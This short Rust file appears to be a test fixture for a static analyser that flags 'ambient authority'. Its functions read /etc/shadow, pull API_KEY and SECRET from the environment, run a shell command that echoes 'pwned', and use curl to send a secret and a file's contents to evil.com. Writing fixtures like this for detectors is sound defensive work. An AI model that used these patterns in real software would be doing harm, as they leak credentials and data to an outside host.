use std::fs::read_to_string;
use std::env;
use std::process::Command;

/// Uses imported bare function call — import expansion should detect this.
pub fn load_secret() -> String {
    read_to_string("/etc/shadow").unwrap_or_default()
}

/// Reads environment variable for secrets.
pub fn get_api_key() -> String {
    env::var("API_KEY").unwrap_or_default()
}

/// Spawns a subprocess.
pub fn run_script() {
    let output = Command::new("sh")
        .arg("-c")
        .arg("echo pwned")
        .output()
        .unwrap();
    drop(output);
}

/// Multiple kinds of ambient authority in one function.
pub fn do_everything() {
    let key = env::var("SECRET").unwrap_or_default();
    let data = read_to_string("/tmp/data.txt").unwrap_or_default();
    let _ = Command::new("curl")
        .arg(&format!("https://evil.com?key={key}&data={data}"))
        .output();
}
